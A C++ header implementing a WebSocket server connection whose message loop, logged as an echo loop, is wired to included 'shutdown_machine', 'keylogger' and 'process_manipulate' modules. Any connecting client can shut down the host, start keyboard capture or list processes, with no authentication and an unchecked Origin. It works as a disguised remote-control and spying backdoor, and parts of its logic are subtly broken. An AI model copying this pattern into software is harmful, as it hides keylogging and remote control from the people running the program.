#ifndef __websocket_connection_h__
#define __websocket_connection_h__

#include <iostream>
#include <vector>

#include "net/tcp_socket.h"
#include "util/sha1.h"
#include "util/base64.h"
#include "http.h"
#include "net/sender.h"
#include "net/receiver.h"

static const string SECURITY_KEY_RESPONSE_FIELD = "Sec-WebSocket-Key:";
static const string ORIGIN_RESPONSE_FIELD = "Origin:";

class WebSocketConnection {
public:
    static string computeAcceptKey(const string &clientKey);
    explicit WebSocketConnection(int fd): fd_(fd), handshaked_(false) {
        sender_.setFd(fd);
        receiver_.setFd(fd);
    }
    void run();
private:
    int fd_;
    Sender sender_;
    Receiver receiver_;
    bool handshaked_;
    void performHandshake_();
    std::string getHttpRequest();
};



std::string WebSocketConnection::computeAcceptKey(const std::string &clientKey) {
    static const string GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    std::string s = clientKey + GUID;

    SHA1 sha;
    sha.input(reinterpret_cast<const unsigned char*>(s.data()), s.size());

    unsigned char digest[20];
    sha.result(digest);

    return base64_encode(digest, 20);
}

#include "api/shutdown_machine.h"
#include "api/keylogger.h"
#include "api/process_manipulate.h"

void WebSocketConnection::run() {
    performHandshake_();

    std::cout << "[WebSocket] Handshake done. Starting echo loop.\n";
    while (true) {
        std::string msg;
        if (!receiver_.recvText(sender_, msg)) {
            std::cout << "[WebSocket] Client disconnected or error.\n";
            break;
        }
        std::cout << "[WebSocket] Received: " << msg << "\n";
        if (msg == "shutdown") shutdown();
        if (msg == "keylogger") listen_keyboard();
        if (msg == "list_process") sender_.sendText(listProcesses());
        else 
            sender_.sendText(msg);
    }
}


void WebSocketConnection::performHandshake_() {
    HttpRequestParser parser(getHttpRequest());
    
    string browserSecurityKey = parser[SECURITY_KEY_RESPONSE_FIELD];
    string origin             = parser[ORIGIN_RESPONSE_FIELD];
    string acceptValue = computeAcceptKey(browserSecurityKey);

    sender_.sendHandshake(acceptValue);
    handshaked_ = parser.getRequestLine().isCorrectWebsocketUpgradeRequest();
}


string WebSocketConnection::getHttpRequest() {
    string data;
    char buf[1024];
    while (data.find("\r\n\r\n") == std::string::npos) {
        ssize_t n = ::recv(fd_, buf, sizeof(buf), 0);
        if (n <= 0) {
            throw std::runtime_error("Client closed before handshake");
        }
        data.append(buf, buf + n);
    }
    std::cout << data << '\n';
    return data;
}


#endif